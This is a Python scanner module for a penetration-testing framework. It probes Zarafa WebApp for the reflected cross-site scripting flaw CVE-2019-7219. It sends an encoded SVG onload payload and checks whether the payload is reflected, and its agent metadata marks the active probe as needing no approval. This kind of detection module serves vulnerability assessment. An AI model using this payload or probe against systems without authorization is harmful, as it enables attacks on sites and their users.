#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zarafa WebApp 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zarafa WebApp <=2.0.1.47791 - Cross-Site Scripting Detection',
        'description': 'Zarafa WebApp 2.0.1.47791 and earlier contains an unauthenticated reflected cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'zarafa', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/verifysecurity/CVE-2019-7219',
            'https://stash.kopano.io/repos?visibility=public',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-7219',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2019-7219',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<svg/onload=alert(/xss/)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Zarafa WebApp <=2.0.1.47791 - Cross-Site Scripting detected",
                path='/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E',
            )
            return True
        return False

